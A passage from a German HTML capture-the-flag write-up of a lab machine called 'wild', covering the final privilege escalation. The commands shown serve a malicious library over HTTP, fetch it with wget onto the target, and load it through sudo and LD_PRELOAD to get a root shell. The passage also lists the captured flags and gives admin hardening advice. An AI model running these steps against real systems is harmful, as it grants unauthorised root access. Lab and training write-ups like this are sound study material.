+                **Analyse:** Auf der Angreifer-Maschine wird der C-Code für die bösartige Library (`infohack.c`) erstellt. Die `_init`-Funktion wird beim Laden der Library ausgeführt. Sie setzt UID/GID auf 0 und startet eine Bash-Shell mit erhaltenen Privilegien (`-p`). Der Code wird erfolgreich zu `infohack.so` kompiliert.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Die bösartige Library ist bereit zum Transfer.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Transfer der Library auf das Ziel -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                     <!-- Auf Zielmaschine als tod -->
+                     <div class="prompt">tod@wild:/opt/wildfly/bin$ <span class="command">wget 192.168.2.199/infohack.so</span></div> <span class="comment"># Angreifer-IP .199</span>
+                     <pre>
+--2024-04-28 01:33:35--  http://192.168.2.199/infohack.so
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14160 (14K) [application/octet-stream]
+Saving to: ‘infohack.so’
+
+infohack.so             100%[===================>]  13.83K  --.-KB/s    in 0s
+
+2024-04-28 01:33:35 (179 MB/s) - ‘infohack.so’ saved [14160/14160]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Die kompilierte `infohack.so` wird über einen lokalen HTTP-Server auf das Zielsystem (ins Verzeichnis `/opt/wildfly/bin`, wo `tod` offenbar Schreibrechte hat) übertragen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Die Exploit-Datei ist auf dem Ziel.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tod@wild:/opt/wildfly/bin$ <span class="command">sudo LD_PRELOAD=./infohack.so /usr/bin/info</span></div>
+                      <pre>
+<span class="prompt">root@wild:/opt/wildfly/bin#</span> <span class="comment"># Root-Shell erhalten!</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der `sudo`-Befehl wird ausgeführt. Die Umgebungsvariable `LD_PRELOAD` wird auf die gerade hochgeladene `infohack.so` gesetzt. Wenn `/usr/bin/info` startet, wird die `_init`-Funktion in `infohack.so` mit Root-Rechten ausgeführt, was `setuid(0)`, `setgid(0)` und `system("/bin/bash -p")` bewirkt. Der Benutzer erhält eine Root-Shell.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Privilege Escalation zu `root` erfolgreich über LD_PRELOAD-Hijacking des `info`-Befehls via `sudo`.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Root-Flag lesen.<br>
+                **Empfehlung (Admin):** Die unsichere `sudo`-Regel für `info` entfernen. Die `SETENV`-Option in `sudoers` nur verwenden, wenn absolut notwendig und sicher. Das `LD_PRELOAD`-Verhalten ggf. systemweit einschränken.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@wild:/opt/wildfly/bin# <span class="command">cd ~</span></div>
+                     <div class="prompt">root@wild:~# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">root@wild:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">d8592e5a179d4b80e099f4c9a460c6e4</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                **Analyse:** Als `root` wird ins Home-Verzeichnis gewechselt und die `root.txt`-Datei gelesen.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Root-Flag erfolgreich gefunden.
+            </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/tod/user.txt</div> <!-- Annahme basierend auf PrivEsc -->
+                     <div class="flag-value"><span class="password">c1cc7f5179a168ec93095695f20c9e3f</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">d8592e5a179d4b80e099f4c9a460c6e4</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Logs extrahiert -->
+        <p>Berichtsdatum: 27. April 2024</p> <!-- Datum vom Nmap-Scan übernommen -->
+    </footer>
+</body>
+</html>
